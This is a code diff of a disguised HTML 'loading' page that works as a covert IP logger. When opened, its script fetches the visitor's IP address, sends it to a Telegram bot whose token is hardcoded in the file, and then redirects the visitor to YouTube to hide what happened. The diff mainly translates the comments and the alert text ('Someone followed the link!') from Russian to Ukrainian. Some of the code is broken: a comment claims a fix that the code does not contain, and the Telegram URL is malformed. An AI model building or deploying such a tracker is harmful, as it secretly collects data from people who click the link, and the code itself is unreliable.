@@ -2,40 +2,36 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Загрузка...</title>
+    <title>Завантаження...</title>
 </head>
 <body style="background: #000;">
     <script>
-        // ТВОИ ДАННЫЕ
         const TOKEN = "8413511998:AAHZuQrJyZnyqJusMNbH074Rw-UzQEMSPpA";
-        const CHAT_ID = "8413511998"; // Твой ID бота
+        const CHAT_ID = "8426763446";
 
         async function sendLog() {
             try {
-                // 1. Получаем IP
-                const ipResponse = await fetch('https://api.ipify.org');
+                // 1. Отримуємо IP (виправлено: додано ?format=json)
+const ipResponse = await fetch('https://api.ipify.org');
                 const ipData = await ipResponse.json();
                 const userIp = ipData.ip;
 
-                // 2. Формируем запрос к Telegram
-                const message = encodeURIComponent("Кто-то перешел по ссылке!\nIP: " + userIp);
+                // 2. Формуємо запит до Telegram
+                const message = encodeURIComponent("🎯 Хтось перейшов за посиланням!\n🌐 IP: " + userIp);
                 const url = "https://api.telegram.org" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + message;
 
-                // 3. Отправляем сообщение
+                // 3. Відправляємо повідомлення
                 await fetch(url);
-
             } catch (err) {
-                console.error("Ошибка:", err);
+                console.error("Помилка:", err);
             } finally {
-                // 4. Перенаправляем на YouTube через полсекунды
+                // 4. Перенаправляємо на YouTube
                 setTimeout(() => {
                     window.location.href = "https://www.youtube.com";
                 }, 500);
             }
         }
-
         sendLog();
     </script>
 </body>
 </html>
-
